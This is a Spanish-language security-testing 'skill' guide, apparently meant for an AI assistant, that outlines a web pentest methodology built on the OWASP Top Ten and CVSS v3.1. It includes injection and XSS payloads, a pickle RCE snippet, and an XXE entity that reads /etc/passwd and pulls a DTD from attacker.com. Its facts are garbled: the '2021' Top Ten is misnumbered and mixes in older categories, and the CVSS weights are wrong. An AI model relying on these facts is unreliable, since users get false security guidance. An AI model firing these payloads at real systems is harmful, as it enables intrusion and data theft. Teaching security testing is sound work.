# OWASP BALS - Security Testing Framework Skill

**Versión**: 1.0.0  
**Última actualización**: Enero 2026  
**Metodología**: OWASP Top Ten 2021 + CVSS v3.1

---

## Descripción

Skill profesional para evaluación de seguridad de aplicaciones web usando OWASP Top Ten 2021. Proporciona metodología estructurada, checklist de pruebas, scoring CVSS, y generación de reportes profesionales.

## Casos de Uso

Esta skill es ideal para:

- Evaluaciones de seguridad (security assessments)
- Penetration testing (pentesting)
- Red team exercises
- Auditorías de cumplimiento
- Validación post-remediación
- Capacitación en seguridad
- Análisis de vulnerabilidades
- Reportes ejecutivos para stakeholders

---

## Fases de Evaluación

### Fase 1: Reconnaissance (Análisis Inicial)

**Objetivo**: Recolectar información sin explotar vulnerabilidades.

**Actividades**:
- Identificación de tecnologías (fingprinting)
- Enumeración de endpoints y rutas
- Análisis de arquitectura de seguridad
- Recopilación de información pública (OSINT)
- Identificación de dominios y subdominios
- Análisis de certificados SSL/TLS

**Deliverable**: Mapa de superficie de ataque

---

### Fase 2: Vulnerability Scanning (Escaneo)

**Objetivo**: Identificar vulnerabilidades conocidas automáticamente.

**Herramientas**:
- OWASP ZAP (análisis web)
- Nuclei (plantillas de vulnerabilidades)
- SAST (análisis estático de código)
- Dependency scanners (librerías vulnerables)
- DAST (análisis dinámico)

**Deliverable**: Lista de vulnerabilidades potenciales

---

### Fase 3: Manual Testing (Pruebas Manuales)

**Objetivo**: Validar hallazgos y encontrar lógica de negocio defectuosa.

**Actividades**:
- Prueba de cada vector OWASP
- Testing de casos edge
- Análisis de lógica de negocio
- Validación de controles de seguridad
- Testing de estado de sesión

**Deliverable**: Vulnerabilidades confirmadas con prueba de concepto

---

### Fase 4: Risk Analysis (Análisis de Riesgo)

**Objetivo**: Priorizar hallazgos por impacto real.

**Metodología CVSS v3.1**:
- Scoring objetivo (0.0-10.0)
- Análisis de probabilidad de explotación
- Impacto en confidencialidad, integridad, disponibilidad
- Contexto del negocio

**Deliverable**: Matriz de riesgo priorizada

---

### Fase 5: Reporting (Reportes)

**Objetivo**: Documentar hallazgos profesionalmente.

**Entregables**:
- Reporte ejecutivo (C-level)
- Hallazgos técnicos detallados
- Plan de remediación con cronograma
- Validación post-arreglo

---

## OWASP Top Ten 2021 - Vector Completo

### A01:2021 - Injection

**CVSS Base Score**: 9.8 CRITICAL

**Descripción**: Envío de datos no confiables a intérpretes como SQL, NoSQL, comandos OS, LDAP.

**Subtecnologías**:
- SQL Injection
- NoSQL Injection
- Command Injection (OS)
- LDAP Injection
- XPath Injection
- Template Injection

**Ejemplos de Payloads**:
```
SQL:     ' OR '1'='1' --
         ' UNION SELECT * FROM users --
NoSQL:   {"$ne": null}
         {"$where": "1==1"}
Command: ; whoami
         | cat /etc/passwd
         ` id `
LDAP:    *)(uid=*))(|(uid=*
```

**Testing Checklist**:
- [ ] Probar campos de entrada con caracteres especiales
- [ ] Intentar escape de comillas simples y dobles
- [ ] Probar comentarios (-- , # , /* */)
- [ ] Intentar UNION-based y time-based blind SQLi
- [ ] Validar manejo de errores

---

### A02:2021 - Broken Authentication

**CVSS Base Score**: 9.3 HIGH

**Descripción**: Fallas en autenticación, gestión de sesiones, o credenciales débiles.

**Ataques Comunes**:
- Fuerza bruta de credenciales
- Sesiones predecibles
- Cookies sin HttpOnly/Secure
- Información de sesión en URL
- Credenciales por defecto no cambiadas
- Recuperación de contraseña débil

**Testing Checklist**:
- [ ] Probar brute force (intentos múltiples)
- [ ] Analizar tokens de sesión (entropía, predecibilidad)
- [ ] Verificar flags HttpOnly y Secure en cookies
- [ ] Validar expiración de sesión
- [ ] Probar cambio de contraseña sin validación
- [ ] Buscar credenciales por defecto

---

### A03:2021 - Sensitive Data Exposure

**CVSS Base Score**: 7.5 HIGH

**Descripción**: Exposición de datos sensibles en tránsito o en reposo.

**Vulnerabilidades**:
- Transmisión sin encriptación (HTTP)
- Encriptación débil (DES, MD5)
- Claves en código fuente o configuración
- Datos sensibles en logs o caché
- PII (Personally Identifiable Information) expuesta
- Información sensible en URLs o parámetros

**Testing Checklist**:
- [ ] Verificar uso de HTTPS (TLS 1.2+)
- [ ] Revisar certificados SSL/TLS
- [ ] Buscar datos sensibles en código fuente
- [ ] Validar encriptación de bases de datos
- [ ] Revisar logs para información sensible
- [ ] Verificar caché del navegador

---

### A04:2021 - Broken Access Control

**CVSS Base Score**: 9.1 CRITICAL

**Descripción**: Falta de validación de autorización adecuada.

**Ataques Comunes**:
- IDOR (Insecure Direct Object References)
- Escalada de privilegios vertical
- Escalada de privilegios horizontal
- Bypass de controles de autorización
- Missing access controls en APIs

**Testing Checklist**:
- [ ] Probar acceso a recursos de otros usuarios (ID secuencial)
- [ ] Intentar acceso sin autenticación
- [ ] Probar escalada de privilegios
- [ ] Validar autorización en APIs
- [ ] Revisar permisos de archivos/directorios
- [ ] Probar funciones administrativas

---

### A05:2021 - Security Misconfiguration

**CVSS Base Score**: 8.6 HIGH

**Descripción**: Configuraciones de seguridad incompletas, por defecto, o incorrectas.

**Problemas Típicos**:
- Headers de seguridad faltantes
- Debugging activado en producción
- Directorios expuestos (.git, backup files)
- Servicios innecesarios ejecutándose
- Software desactualizado (vulnerable)
- Configuración por defecto no cambiada
- Stack traces detallados en errores

**Testing Checklist**:
- [ ] Verificar headers de seguridad (CSP, X-Frame-Options, etc)
- [ ] Revisar respuestas de error por información sensible
- [ ] Buscar directorios comunes (.git, /admin, /backup)
- [ ] Identificar servicios y versiones
- [ ] Revisar configuración de CORS
- [ ] Validar métodos HTTP permitidos

---

### A06:2021 - XML External Entity (XXE)

**CVSS Base Score**: 9.8 CRITICAL

**Descripción**: Procesamiento de XML inseguro con entidades externas.

**Ataques**:
- XXE Basic (local file disclosure)
- XXE Blind (out-of-band exfiltration)
- SSRF vía XXE
- DoS vía Billion Laughs Attack
- XXE en JSON (menos común)

**Payload Ejemplos**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Out-of-band XXE -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
]>
```

**Testing Checklist**:
- [ ] Identificar endpoints que aceptan XML
- [ ] Probar XXE básico (file disclosure)
- [ ] Probar XXE blind (out-of-band)
- [ ] Probar XXE para SSRF
- [ ] Verificar DTD externo permitido
- [ ] Probar protecciones contra billion laughs

---

### A07:2021 - Broken API Authentication

**CVSS Base Score**: 9.1 CRITICAL

**Descripción**: Fallos de autenticación específicos en APIs REST/GraphQL/SOAP.

**Vulnerabilidades**:
- JWT mal firmado o sin validación
- API keys en headers sin validación
- OAuth2 misconfiguration
- Tokens con expiración muy larga
- Información sensible en tokens
- Rate limiting ausente

**Testing Checklist**:
- [ ] Probar manipulación de JWT (cambiar payload, remover firma)
- [ ] Validar expiración de tokens
- [ ] Probar API keys comprometidas
- [ ] Validar OAuth2 flow
- [ ] Revisar rate limiting
- [ ] Probar acceso sin token

---

### A08:2021 - Cross-Site Scripting (XSS)

**CVSS Base Score**: 7.1 HIGH

**Descripción**: Inyección de código JavaScript ejecutado en navegador de víctimas.

**Tipos de XSS**:
- Reflected XSS (URL parameters)
- Stored XSS (base de datos)
- DOM-based XSS (JavaScript)
- Mutated XSS (HTML parsing quirks)

**Payload Ejemplos**:
```javascript
<script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
```

**Testing Checklist**:
- [ ] Probar reflected XSS en parámetros GET/POST
- [ ] Probar stored XSS en comentarios, perfiles
- [ ] Validar DOM-based XSS en JavaScript
- [ ] Revisar WAF/filtros de entrada
- [ ] Probar bypass de protecciones
- [ ] Revisar Content-Security-Policy

---

### A09:2021 - Insecure Deserialization

**CVSS Base Score**: 9.8 CRITICAL

**Descripción**: Deserialización insegura de objetos no confiables.

**Lenguajes Afectados**:
- Java (ObjectInputStream)
- Python (pickle, yaml.unsafe_load)
- PHP (unserialize)
- .NET (BinaryFormatter)
- Node.js (algunas librerías)

**Ataques**:
- Remote Code Execution (RCE)
- Privilege escalation
- DoS vía gadget chains
- Logic bypass

**Payload Ejemplo (Python)**:
```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
```

**Testing Checklist**:
- [ ] Identificar datos serializados
- [ ] Probar modificación de objetos
- [ ] Validar gadget chains disponibles
- [ ] Probar RCE vía deserialization
- [ ] Revisar librerías vulnerable

---

### A10:2021 - Insufficient Logging & Monitoring

**CVSS Base Score**: 7.5 HIGH

**Descripción**: Falta de logging y alerting adecuados de eventos de seguridad.

**Problemas**:
- Acciones críticas sin logging
- Logs sin información suficiente
- Logs accesibles públicamente
- Sin alertas en eventos importantes
- Retención insuficiente
- No integración con SIEM

**Eventos Críticos a Loguear**:
- Intentos de login fallidos
- Acceso a funciones administrativas
- Cambios en privilegios
- Cambios en configuración
- Acceso a datos sensibles
- Intentos de explotación
- Cambios en permisos

**Testing Checklist**:
- [ ] Realizar acción maliciosa y verificar logging
- [ ] Revisar formatos de log
- [ ] Validar información de contexto
- [ ] Verificar timestamp sincronizado
- [ ] Revisar retención de logs
- [ ] Validar integridad de logs

---

## CVSS v3.1 - Scoring Completo

### Formato
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### Vectores

| Métrica | Abreviatura | Valores | Impacto |
|---------|------------|---------|---------|
| Attack Vector | AV | N(9.8)/A(8.6)/L(5.3)/P(2.3) | Red Network/Adjacent/Local/Physical |
| Attack Complexity | AC | L(0)/H(1.77) | Low/High |
| Privileges Required | PR | N(0)/L(0.62)/H(0.27) | None/Low/High |
| User Interaction | UI | N(0)/R(0.85) | None/Required |
| Scope | S | U/C | Unchanged/Changed |
| Confidentiality | C | N(0)/L(0.56)/H(1) | None/Low/High |
| Integrity | I | N(0)/L(0.56)/H(1) | None/Low/High |
| Availability | A | N(0)/L(0.56)/H(1) | None/Low/High |

### Scoring Matrix

| Score | Severity | Color |
|-------|----------|-------|
| 9.0-10.0 | CRITICAL | Rojo |
| 7.0-8.9 | HIGH | Naranja |
| 4.0-6.9 | MEDIUM | Amarillo |
| 0.1-3.9 | LOW | Verde |
| 0.0 | NONE | Gris |

### Ejemplo de Cálculo

**SQLi típico**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 CRITICAL`

- **AV:N** = Red (9.8 multiplicador)
- **AC:L** = Bajo (0 base)
- **PR:N** = Sin privilegios (0 base)
- **UI:N** = Sin interacción usuario (0 base)
- **S:U** = Scope sin cambios
- **C:H/I:H/A:H** = Impacto alto en todo

---

## Metodología de Prueba

### Matriz de Testing

Para cada vector OWASP:

1. **Técnica** - ¿Cómo se prueba?
2. **Payload** - ¿Qué se envía?
3. **Indicador** - ¿Qué indica vulnerabilidad?
4. **CVSS** - ¿Cuál es la severidad?
5. **Remediación** - ¿Cómo se arregla?

### Checklist de Testing Completo

**Reconnaissance**:
- [ ] Fingerprinting de tecnologías
- [ ] Enumeración de endpoints
- [ ] Análisis de certificados
- [ ] Búsqueda de subdominios
- [ ] OSINT básico

**Scanning**:
- [ ] OWASP ZAP scan
- [ ] Nuclei templates
- [ ] Dependency check
- [ ] SAST (si acceso a código)
- [ ] DAST completo

**Manual Testing** (por vector):
- [ ] A01 - Injection (6 subtipos)
- [ ] A02 - Authentication (5 métodos)
- [ ] A03 - Sensitive Data (3 métodos)
- [ ] A04 - Access Control (3 métodos)
- [ ] A05 - Misconfiguration (7 métodos)
- [ ] A06 - XXE (3 métodos)
- [ ] A07 - API Auth (3 métodos)
- [ ] A08 - XSS (3 tipos)
- [ ] A09 - Deserialization (3 métodos)
- [ ] A10 - Logging (3 validaciones)

**Risk Analysis**:
- [ ] CVSS scoring completo
- [ ] Matriz de priorización
- [ ] Business impact assessment
- [ ] Contexto de cumplimiento

**Reporting**:
- [ ] Reporte ejecutivo
- [ ] Hallazgos técnicos
- [ ] Plan de remediación
- [ ] Validación post-arreglo

---

## Compliance Mapping

Cada hallazgo se mapea a estándares:

| Estándar | Cobertura | Utilidad |
|----------|-----------|----------|
| **PCI-DSS v3.2.1** | Cardholder data protection | Industria pagos |
| **GDPR** | Personal data protection | LATAM/EU data |
| **HIPAA** | Healthcare data | Industria salud |
| **NIST CSF** | Cybersecurity best practices | Gobierno/Enterprise |
| **ISO 27001** | Information security | Auditorías globales |

---

## Deliverables

### 1. Reporte Ejecutivo
- Resumen de hallazgos
- Matriz de riesgo
- Recomendaciones prioritarias
- Cronograma sugerido

### 2. Hallazgos Técnicos
- Descripción detallada
- Pasos de reproducción
- Payloads de ejemplo
- Impacto técnico y de negocio
- Evidencia (screenshots/logs)
- Recomendaciones específicas

### 3. Plan de Remediación
- Roadmap de arreglos
- Cronograma
- Asignación de recursos
- Criterios de validación

---

## Prompts Recomendados

**Para Reconnaissance**:
```
"Analiza [URL] y proporciona fingerprinting de tecnologías, 
enumeración de endpoints, y análisis de arquitectura de seguridad"
```

**Para Testing Específico**:
```
"Valida este endpoint para SQL Injection usando OWASP BALS. 
Proporciona payloads, validación, CVSS score, y remediación"
```

**Para Reporting**:
```
"Genera reporte ejecutivo para hallazgos OWASP encontrados. 
Incluye matriz de riesgo, priorizaciones, y plan de acción"
```

---

## Referencias

- OWASP Top Ten: https://owasp.org/www-project-top-ten/
- CVSS v3.1: https://www.first.org/cvss/v3.1/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE (Common Weakness Enumeration): https://cwe.mitre.org/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

---

**Versión**: 1.0.0  
**Última actualización**: Enero 2026  
**Autor**: Byron Antonio Lainez Sasvin  
**GitHub**: [@Byronsasvin](https://github.com/Byronsasvin)
